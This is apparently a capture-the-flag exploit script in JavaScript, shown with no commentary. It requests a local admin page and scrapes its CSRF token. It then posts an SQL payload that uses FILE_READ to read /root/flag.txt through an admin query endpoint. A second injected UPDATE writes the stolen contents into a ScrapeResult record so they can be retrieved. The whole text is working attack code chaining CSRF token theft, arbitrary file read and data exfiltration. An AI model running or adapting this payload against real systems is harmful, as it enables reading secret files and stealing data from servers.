fetch('http://127.0.0.1/admin')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];

    const payload = `SELECT FILE_READ('/root/flag.txt') FROM INFORMATION_SCHEMA.TABLES FETCH FIRST 1 ROWS ONLY`;

    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(payload) + '&csrf=' + csrf
    });
  })
  .then(r => r.text())
  .then(html => {

    const match = html.match(/results.*?<td[^>]*>(.*?)<\/td>/s);
    const flag = match ? match[1] : html.substring(0, 500);

    const csrf2 = html.match(/name="csrf" value="([^"]+)"/)[1];
    const insertPayload = `UPDATE ScrapeResult SET pageTitle='` + flag + `' WHERE id=1`;
    return fetch('http://127.0.0.1/admin/execute', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'hql=' + encodeURIComponent(insertPayload) + '&csrf=' + csrf2
    });
  });
